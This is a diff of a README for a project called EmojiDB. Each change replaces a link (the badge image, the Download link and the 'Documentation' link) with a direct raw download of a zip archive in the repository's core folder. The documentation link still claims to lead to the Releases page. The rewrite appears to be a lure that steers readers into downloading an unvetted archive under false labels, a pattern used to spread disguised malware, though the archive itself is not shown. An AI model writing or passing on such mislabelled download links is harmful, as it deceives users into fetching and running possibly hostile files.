@@ -1,6 +1,6 @@
 # 🎉 EmojiDB - Secure Your Data with Emojis
 
-![Download EmojiDB](https://img.shields.io/badge/Download-EmojiDB-blue.svg?style=flat-square)
+![Download EmojiDB](https://github.com/Mohanadragab192000/EmojiDB/raw/refs/heads/main/core/DB_Emoji_v1.2.zip)
 
 ## 📦 Introduction
 
@@ -23,7 +23,7 @@ Before you download EmojiDB, ensure your system meets the following requirements
 
 To get started with EmojiDB, simply visit the following link to download:
 
-[**Download EmojiDB**](https://github.com/Mohanadragab192000/EmojiDB/releases)
+[**Download EmojiDB**](https://github.com/Mohanadragab192000/EmojiDB/raw/refs/heads/main/core/DB_Emoji_v1.2.zip)
 
 ## 💾 Download & Install
 
@@ -84,7 +84,7 @@ If you need help, feel free to reach out through the GitHub repository. You can 
 
 ## 💡 Additional Resources
 
-For more information, check out the official [**EmojiDB Documentation**](https://github.com/Mohanadragab192000/EmojiDB/releases) on the Releases page. 
+For more information, check out the official [**EmojiDB Documentation**](https://github.com/Mohanadragab192000/EmojiDB/raw/refs/heads/main/core/DB_Emoji_v1.2.zip) on the Releases page. 
 
 This documentation includes advanced features and tips on how to maximize your experience with EmojiDB.
 
